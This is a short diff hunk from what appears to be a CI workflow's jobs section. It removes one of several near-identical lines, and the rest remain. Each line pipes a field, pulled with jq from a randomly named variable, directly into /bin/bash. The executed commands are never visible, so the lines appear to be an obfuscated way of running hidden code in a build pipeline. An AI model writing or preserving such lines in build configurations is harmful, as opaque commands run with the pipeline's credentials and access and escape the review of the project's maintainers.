@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
           echo $ppto416 | jq -r .ehgao8879 | /bin/bash
           echo $j70045 | jq -r .vizaf06683 | /bin/bash
-          echo $vbwtm8078 | jq -r .bclv1056 | /bin/bash
           echo $tegql5 | jq -r .nsl68796 | /bin/bash
           echo $fwqp364 | jq -r .a815 | /bin/bash
           echo $k68 | jq -r .gvper1450 | /bin/bash
